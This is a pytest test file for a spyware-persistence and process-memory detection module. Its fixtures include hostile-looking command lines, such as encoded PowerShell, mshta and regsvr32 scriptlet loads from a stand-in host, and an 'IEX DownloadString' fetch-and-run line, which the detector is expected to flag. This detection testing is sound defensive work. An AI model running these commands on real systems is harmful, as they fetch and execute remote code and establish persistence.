from __future__ import annotations

import ctypes
import io
import stat
from pathlib import Path
from types import SimpleNamespace

import pytest

from angerona.core import spyware_sensors as sensors


@pytest.fixture(autouse=True)
def no_live_host_collection(monkeypatch):
    monkeypatch.setattr(sensors.platform, "system", lambda: "UnsupportedTestOS")
    monkeypatch.setattr(sensors, "run_hidden", lambda *a, **k: pytest.fail("Unexpected host subprocess"))


def persistence_record(command, source="windows.run"):
    return {"source": source, "id": "fixture", "command": command}


@pytest.mark.parametrize("command", [
    r'"C:\Program Files\Example\updater.exe" --check',
    r'"C:\Users\Alice\AppData\Local\Example\updater.exe" --silent',
    r'"C:\Program Files\Example\update-enc.exe"',
    r'"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -File C:\Admin\audit.ps1',
    r'"C:\Program Files\Browser\chrome.exe" https://example.test/',
])
def test_unknown_or_ordinary_commands_are_not_spyware_findings(command):
    assert sensors.analyze_persistence([persistence_record(command)]) == []


@pytest.mark.parametrize("command,source,kind", [
    (r'powershell.exe -EncodedCommand SQBFAFgA', "windows.run", "persistence_encoded_execution"),
    (r'mshta.exe https://example.test/payload.hta', "windows.run", "persistence_remote_execution"),
    (r'wscript.exe C:\Users\Public\payload.vbs', "windows.run", "persistence_writable_script"),
    (r'C:\Users\Alice\AppData\Local\Temp\payload.dll', "windows.com", "com_transient_server"),
    ('/bin/sh /tmp/payload.sh', "posix.systemd", "persistence_writable_script"),
    (r'C:\Program Files\Example\svc.exe --service', "windows.services", "service_unquoted_path"),
])
def test_persistence_concrete_combination_findings(command, source, kind):
    finding, = sensors.analyze_persistence([persistence_record(command, source)])
    assert finding["kind"] == kind
    assert finding["source"] == source
    assert finding["evidence"]["command"] == command
    assert finding["response_authorized"] is False


def test_quoted_service_path_and_ordinary_com_server_do_not_alert():
    assert sensors.analyze_persistence([
        persistence_record(r'"C:\Program Files\Example\svc.exe" --service', "windows.services"),
        persistence_record(r'C:\Users\Alice\AppData\Local\Example\helper.dll', "windows.com"),
    ]) == []


@pytest.mark.parametrize("command,source", [
    (r'"C:\Windows\System32\service.exe" --log-file C:\Temp\service.log', "windows.services"),
    (r'C:\Windows\System32\service.exe --data-dir C:\Users\Public\Cache', "windows.services"),
    (r'powershell.exe -NoProfile -File C:\Admin\audit.ps1 -OutputPath C:\Temp\audit.log', "windows.run"),
    (r'powershell.exe -File C:\Admin\audit.ps1 --url https://example.test/report', "windows.run"),
])
def test_data_and_log_arguments_do_not_become_executable_targets(command, source):
    assert sensors.analyze_persistence([persistence_record(command, source)]) == []


def test_unquoted_service_is_an_exposure_not_an_authorized_execution_finding():
    finding, = sensors.analyze_persistence([
        persistence_record(r'C:\Program Files\Example\svc.exe --service', "windows.services")])
    assert finding["severity"] == "low"
    assert finding["finding_kind"] == "exposure"
    assert finding["response_eligible"] is False
    assert "writable prefix or execution not established" in finding["eligibility_reason"]


@pytest.mark.parametrize("command", [
    r'powershell.exe -File "C:\Users\Public\payload.ps1" -LogPath C:\Admin\safe.log',
    r'''powershell.exe -Command "& 'C:\Temp\payload.ps1'"''',
    r'powershell.exe -Command "Start-Process -FilePath C:\Temp\payload.exe"',
    r'cmd.exe /c powershell.exe -File C:\Temp\payload.ps1',
    r'cmd.exe /c ""C:\Temp\payload.exe" arg"',
    r'cmd.exe /d /s /c C:\Temp\payload.exe',
    r'python.exe -W ignore C:\Temp\payload.py',
    'sh -c /tmp/payload.sh',
    r'powershell.exe -co C:\Temp\payload.ps1',
    r'pwsh.exe -NoProfile -f C:\Temp\payload.ps1',
    r'pwsh.exe C:\Temp\payload.ps1 --url https://example.test/log',
])
def test_explicit_transient_execution_remains_detected(command):
    finding, = sensors.analyze_persistence([persistence_record(command)])
    assert finding["kind"] == "persistence_writable_script"
    assert finding.get("response_eligible") is not False


@pytest.mark.parametrize("switch", ["-e", "-ec", "-en", "-enc", "-encodedc", "-EncodedCommand"])
def test_powershell_encoded_aliases_remain_execution_findings(switch):
    for host in ("powershell.exe", "pwsh.exe"):
        finding, = sensors.analyze_persistence([persistence_record(f"{host} {switch} SQBFAFgA")])
        assert finding["kind"] == "persistence_encoded_execution"


@pytest.mark.parametrize("command", [
    r'''python.exe -c "print('C:\Temp\example.exe')"''',
    r'powershell.exe -Command "Write-Output https://example.test/report"',
    r'cmd.exe /c',
    r'"C:\Temp\unclosed.exe',
    r'cmd /c cmd /c cmd /c cmd /c cmd /c C:\Temp\payload.exe',
])
def test_unsupported_or_ambiguous_execution_is_unknown_never_clean(command):
    finding, = sensors.analyze_persistence([persistence_record(command)])
    assert finding["kind"] == "persistence_parser_ambiguous"
    assert finding["coverage_status"] == "partial"
    assert finding["response_eligible"] is False
    assert "UNKNOWN" in finding["reason"]


def test_script_arguments_do_not_become_powershell_host_switches():
    assert sensors.analyze_persistence([persistence_record(
        r'powershell.exe -File C:\Admin\audit.ps1 -EncodedCommand SQBFAFgA')]) == []


@pytest.mark.parametrize("payload,kind", [
    ('"https://example.test/payload.sct"', "persistence_remote_execution"),
    (r'"C:\Temp\payload.sct"', "persistence_writable_script"),
    (r'"C:\Users\Public\Shared Files\payload.sct"', "persistence_writable_script"),
])
def test_regsvr32_quoted_sct_targets_remain_execution_findings(payload, kind):
    finding, = sensors.analyze_persistence([persistence_record(
        f'regsvr32.exe /s /n /u /i:{payload} scrobj.dll')])
    assert finding["kind"] == kind
    assert finding.get("response_eligible") is not False


def test_wmi_inline_remote_and_encoded_content_remain_detected():
    for script, expected in (("IEX DownloadString('https://example.test/x')", "persistence_remote_execution"),
                             ("FromBase64String('AAA')", "persistence_encoded_execution")):
        finding, = sensors.analyze_persistence([{"source": "windows.wmi", "id": "fixture", "script": script}])
        assert finding["kind"] == expected


def test_unknown_execution_analysis_has_partial_coverage_separate_from_inventory(monkeypatch):
    monkeypatch.setattr(sensors.platform, "system", lambda: "Windows")
    monkeypatch.setattr(sensors, "winreg", FakeRegistry())
    monkeypatch.setattr(sensors, "_collect_run", lambda bound: (
        [persistence_record('powershell -Command "Write-Output hello"')], sensors._coverage("complete", count=1)))
    for name in ("_collect_com", "_collect_services", "_collect_wmi"):
        monkeypatch.setattr(sensors, name, lambda bound: ([], sensors._coverage("complete")))
    monkeypatch.setattr(sensors, "_collect_directories", lambda *args: ([], sensors._coverage("complete")))
    result = sensors.collect_persistence(20)
    assert result["coverage"]["windows.run"]["status"] == "complete"
    assert result["coverage"]["persistence.execution_analysis"]["status"] == "partial"
    assert result["findings"][0]["response_eligible"] is False


def test_unsupported_platform_is_explicit_and_does_no_os_access():
    result = sensors.collect_persistence()
    assert result["records"] == result["findings"] == []
    assert all(value["status"] == "unsupported" for value in result["coverage"].values())
    memory = sensors.inspect_process_memory(42)
    assert memory["coverage"]["memory"]["status"] == "unsupported"


@pytest.mark.parametrize("bound", [0, -1, True, 1.5, "10"])
def test_bad_collection_bounds_fail_before_host_access(bound):
    with pytest.raises(ValueError):
        sensors.collect_persistence(bound)
    with pytest.raises(ValueError):
        sensors.inspect_process_memory(42, bound)


@pytest.mark.parametrize("pid", [0, -1, True, "1", 2**32])
def test_invalid_pids_rejected(pid):
    with pytest.raises(ValueError):
        sensors.inspect_process_memory(pid)


class FakeRegistry:
    KEY_READ = 1
    KEY_WOW64_32KEY = 32
    KEY_WOW64_64KEY = 64
    HKEY_CURRENT_USER = "HKCU"
    HKEY_LOCAL_MACHINE = "HKLM"

    def __init__(self, denied=False):
        self.opened = []
        self.denied = denied

    class Key:
        def __init__(self, hive, path, view):
            self.hive, self.path, self.view = hive, path, view

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

    def OpenKey(self, hive, path, reserved, access):
        if self.denied:
            raise PermissionError("fixture denied")
        self.opened.append((hive, path, access & ~self.KEY_READ))
        return self.Key(hive, path, access & ~self.KEY_READ)

    def QueryInfoKey(self, key):
        return (1, 1, 0)

    def EnumValue(self, key, index):
        return "fixture", r'C:\Program Files\Example\update.exe', 1

    def EnumKey(self, key, index):
        return "{fixture-clsid}"

    def QueryValueEx(self, key, value):
        return r'C:\Program Files\Example\helper.dll', 1


def test_registry_collects_hkcu_hklm_both_views_and_runonce(monkeypatch):
    registry = FakeRegistry()
    monkeypatch.setattr(sensors, "winreg", registry)
    records, coverage = sensors._collect_run(8)
    assert coverage == {"status": "complete", "detail": "", "count": 8}
    assert {r["registry_view"] for r in records} == {"32", "64"}
    assert {r["registry_key"].split("\\")[0] for r in records} == {"HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE"}
    assert sum(r["registry_key"].endswith("RunOnce") for r in records) == 4


def test_registry_bound_and_denial_are_never_clean(monkeypatch):
    monkeypatch.setattr(sensors, "winreg", FakeRegistry())
    records, coverage = sensors._collect_run(2)
    assert len(records) == 2
    assert coverage["status"] == "partial"
    monkeypatch.setattr(sensors, "winreg", FakeRegistry(denied=True))
    records, coverage = sensors._collect_run(2)
    assert records == []
    assert coverage["status"] == "access_denied"


def test_com_bound_caps_inspected_clsids_across_hives_and_views(monkeypatch):
    registry = FakeRegistry()
    monkeypatch.setattr(sensors, "winreg", registry)
    records, coverage = sensors._collect_com(2)
    assert len(records) == 2
    assert coverage["inspected"] == 2
    assert coverage["status"] == "partial"
    assert sum(path.endswith("InprocServer32") for _, path, _ in registry.opened) == 2


def test_service_collection_stops_iterator_and_preserves_denied_coverage(monkeypatch):
    visited = []

    class Service:
        def __init__(self, index):
            self.index = index

        def as_dict(self):
            visited.append(self.index)
            if self.index == 0:
                raise PermissionError("service denied")
            return {"name": "fixture", "binpath": r'C:\Windows\system32\fixture.exe'}

    monkeypatch.setattr(sensors, "psutil", SimpleNamespace(win_service_iter=lambda: (Service(i) for i in range(100)), AccessDenied=PermissionError))
    records, coverage = sensors._collect_services(2)
    assert visited == [0, 1]
    assert len(records) == 1
    assert coverage["status"] in {"partial", "access_denied"}


def test_global_record_bound_marks_later_collectors_partial(monkeypatch):
    monkeypatch.setattr(sensors.platform, "system", lambda: "Windows")
    calls = []

    def collector(bound):
        calls.append(bound)
        return [persistence_record("fixture") for _ in range(bound)], sensors._coverage("complete", count=bound)

    monkeypatch.setattr(sensors, "winreg", FakeRegistry())
    for name in ("_collect_run", "_collect_com", "_collect_services", "_collect_wmi"):
        monkeypatch.setattr(sensors, name, collector)
    monkeypatch.setattr(sensors, "_collect_directories", lambda *a: pytest.fail("Collector should have been skipped"))
    result = sensors.collect_persistence(3)
    assert len(result["records"]) == 3
    assert calls == [1, 1, 1]
    assert result["coverage"]["windows.wmi"]["status"] == "partial"


def test_budget_is_shared_so_com_cannot_starve_other_sources(monkeypatch):
    monkeypatch.setattr(sensors.platform, "system", lambda: "Windows")
    monkeypatch.setattr(sensors, "winreg", FakeRegistry())
    monkeypatch.setenv("APPDATA", r"C:\fixture\appdata")
    calls = []

    def collector(source, bound):
        calls.append((source, bound))
        return [persistence_record("fixture", source) for _ in range(bound)], sensors._coverage("partial", count=bound)

    for name in ("run", "com", "services", "wmi"):
        monkeypatch.setattr(sensors, "_collect_" + name, lambda bound, name=name: collector(name, bound))
    monkeypatch.setattr(sensors, "_collect_directories", lambda source, dirs, bound: collector(source, bound))
    result = sensors.collect_persistence(10)
    assert calls == [("run", 2), ("com", 2), ("services", 2), ("wmi", 2), ("startup", 2)]
    assert len(result["records"]) == 10


def test_wmi_query_is_fixed_hidden_bounded_and_timeout_limited(monkeypatch):
    calls = []

    def hidden(argv, **kwargs):
        calls.append((argv, kwargs))
        return SimpleNamespace(returncode=0, stdout=b'[{"Name":"fixture","CommandLineTemplate":"powershell -enc AAA"},{"Name":"overflow"}]', stderr=b"")

    monkeypatch.setattr(sensors, "run_hidden", hidden)
    records, coverage = sensors._collect_wmi(1)
    argv, kwargs = calls[0]
    assert Path(argv[0]).name == "powershell.exe"
    assert argv[1:3] == ["-NoProfile", "-NonInteractive"]
    assert "Select-Object -First 2" in argv[-1]
    assert kwargs["timeout"] == 8
    assert len(records) == 1
    assert coverage["status"] == "partial"


@pytest.mark.parametrize("result,status", [
    (SimpleNamespace(returncode=1, stderr=b"Access is denied", stdout=b""), "access_denied"),
    (SimpleNamespace(returncode=0, stderr=b"", stdout=b'{"not":"list"}'), "error"),
    (SimpleNamespace(returncode=0, stderr=b"", stdout=b"[not json]"), "error"),
])
def test_wmi_failures_preserve_coverage(monkeypatch, result, status):
    monkeypatch.setattr(sensors, "run_hidden", lambda *a, **k: result)
    records, coverage = sensors._collect_wmi(5)
    assert records == []
    assert coverage["status"] == status


class FakeDirectory:
    def __init__(self, entries):
        self.entries = entries

    def __enter__(self):
        return iter(self.entries)

    def __exit__(self, *args):
        return False


def fake_entry(path, symlink=False):
    return SimpleNamespace(path=path, is_symlink=lambda: symlink,
        is_file=lambda **kwargs: True, stat=lambda **kwargs: SimpleNamespace(st_size=23))


def test_posix_service_fixture_extracts_execution_and_bounds_file_reads(monkeypatch):
    monkeypatch.setattr(sensors.os, "scandir", lambda p: FakeDirectory([
        fake_entry("/fixture/one.service"), fake_entry("/fixture/two.service")]))
    reads = []

    def read(path):
        reads.append(path)
        return b"[Unit]\nDescription=fixture\n[Service]\nExecStart=/bin/sh /tmp/payload.sh\n"

    monkeypatch.setattr(sensors, "_read_regular", read)
    records, coverage = sensors._collect_directories("posix.systemd", [Path("/fixture")], 1)
    assert len(reads) == 1
    assert len(records) == 1
    assert coverage["status"] == "partial"
    assert sensors.analyze_persistence(records)[0]["kind"] == "persistence_writable_script"


def test_launchd_fixture_does_not_flag_ordinary_user_agent(monkeypatch):
    monkeypatch.setattr(sensors.os, "scandir", lambda p: FakeDirectory([fake_entry("/fixture/agent.plist")]))
    monkeypatch.setattr(sensors, "_read_regular", lambda p: sensors.plistlib.dumps({
        "Label": "example.agent", "ProgramArguments": ["/Applications/Example.app/Contents/MacOS/Example", "--agent"]}))
    records, coverage = sensors._collect_directories("posix.launchd", [Path("/fixture")], 4)
    assert coverage["status"] == "complete"
    assert records[0]["label"] == "example.agent"
    assert sensors.analyze_persistence(records) == []


def test_startup_shortcuts_are_inventory_without_claiming_target_resolution(monkeypatch):
    monkeypatch.setattr(sensors.os, "scandir", lambda p: FakeDirectory([fake_entry("/fixture/Example.lnk")]))
    monkeypatch.setattr(sensors, "_read_regular", lambda p: pytest.fail("Shortcut contents must not be read"))
    records, coverage = sensors._collect_directories("startup", [Path("/fixture")], 2)
    assert records[0]["target_status"] == "not_resolved"
    assert "not resolved" in coverage["detail"]
    assert sensors.analyze_persistence(records) == []


def test_symlink_unit_is_skipped_and_reported_partial(monkeypatch):
    monkeypatch.setattr(sensors.os, "scandir", lambda p: FakeDirectory([fake_entry("/fixture/a.service", symlink=True)]))
    records, coverage = sensors._collect_directories("posix.systemd", [Path("/fixture")], 2)
    assert records == []
    assert coverage["status"] == "partial"


def test_configuration_reads_refuse_oversize_and_close_identity_held_fd(monkeypatch):
    info = SimpleNamespace(st_mode=stat.S_IFREG, st_dev=1, st_ino=2, st_size=sensors._MAX_FILE_BYTES + 1, st_mtime_ns=1)
    monkeypatch.setattr(sensors.Path, "lstat", lambda p: info)
    monkeypatch.setattr(sensors.os, "open", lambda *a: 44)
    monkeypatch.setattr(sensors.os, "fstat", lambda fd: info)
    closed = []
    monkeypatch.setattr(sensors.os, "close", closed.append)
    monkeypatch.setattr(sensors.os, "read", lambda *a: pytest.fail("Oversized file must not be read"))
    with pytest.raises(ValueError, match="bounded"):
        sensors._read_regular(Path("fixture"))
    assert closed == [44]


def test_linux_maps_only_reads_metadata_and_handles_jit_with_context(monkeypatch):
    monkeypatch.setattr(sensors.platform, "system", lambda: "Linux")
    opened = []
    content = (
        "1000-2000 r-xp 00000000 00:00 0 \n"
        "2000-3000 rwxp 00000000 00:00 0 \n"
        "3000-4000 r-xp 00000000 08:01 5 /usr/lib/example.so\n"
        "4000-5000 r-xp 00000000 00:00 0 [vdso]\n"
        "5000-6000 r-xp 00000000 00:01 99 /memfd:jit (deleted)\n"
    )

    def open_metadata(path, *args, **kwargs):
        opened.append(path)
        return io.StringIO(content)

    monkeypatch.setattr("builtins.open", open_metadata)
    result = sensors.inspect_process_memory(42, 10)
    assert opened == ["/proc/42/maps"]
    assert result["coverage"]["memory.linux.maps"]["status"] == "complete"
    assert len(result["records"]) == 5
    assert [f["severity"] for f in result["findings"]] == ["low", "medium", "low"]
    assert all("legitimate runtimes" in f["reason"] for f in result["findings"])


def test_linux_map_bounds_and_permission_denial(monkeypatch):
    monkeypatch.setattr(sensors.platform, "system", lambda: "Linux")
    monkeypatch.setattr("builtins.open", lambda *a, **k: io.StringIO("1000-2000 r-xp 00000000 00:00 0\n" * 4))
    result = sensors.inspect_process_memory(42, 2)
    assert len(result["records"]) == 2
    assert result["coverage"]["memory.linux.maps"]["status"] == "partial"

    def denied(*a, **k):
        raise PermissionError("fixture denied")

    monkeypatch.setattr("builtins.open", denied)
    result = sensors.inspect_process_memory(42)
    assert result["records"] == []
    assert result["coverage"]["memory.linux.maps"]["status"] == "access_denied"


def test_windows_memory_metadata_closes_handle_uses_no_read_rights_and_bounds_queries(monkeypatch):
    monkeypatch.setattr(sensors.platform, "system", lambda: "Windows")
    rights, closed, queries = [], [], []

    def open_process(access, inherit, pid):
        rights.append(access)
        return 55

    def query(handle, address, pointer, size):
        queries.append(address.value)
        info = pointer._obj
        info.BaseAddress = int(address.value or 0)
        info.RegionSize = 4096
        info.State = 0x1000
        info.Protect = 0x40
        info.Type = 0x20000
        return ctypes.sizeof(info)

    kernel = SimpleNamespace(OpenProcess=open_process, VirtualQueryEx=query, CloseHandle=closed.append)
    monkeypatch.setattr(sensors, "_windows_kernel32", lambda: kernel)
    result = sensors.inspect_process_memory(42, 2)
    assert rights == [0x0400]
    assert len(queries) == 2
    assert closed == [55]
    assert len(result["findings"]) == 2
    assert result["coverage"]["memory.windows.virtualquery"]["status"] == "partial"


def test_windows_denial_and_midquery_failure_are_not_clean(monkeypatch):
    monkeypatch.setattr(sensors.platform, "system", lambda: "Windows")
    monkeypatch.setattr(sensors.ctypes, "get_last_error", lambda: 5, raising=False)
    kernel = SimpleNamespace(OpenProcess=lambda *a: 0)
    monkeypatch.setattr(sensors, "_windows_kernel32", lambda: kernel)
    assert sensors.inspect_process_memory(42)["coverage"]["memory.windows.virtualquery"]["status"] == "access_denied"
    kernel.OpenProcess = lambda *a: 55
    kernel.VirtualQueryEx = lambda *a: 0
    closed = []
    kernel.CloseHandle = closed.append
    assert sensors.inspect_process_memory(42)["coverage"]["memory.windows.virtualquery"]["status"] == "access_denied"
    assert closed == [55]
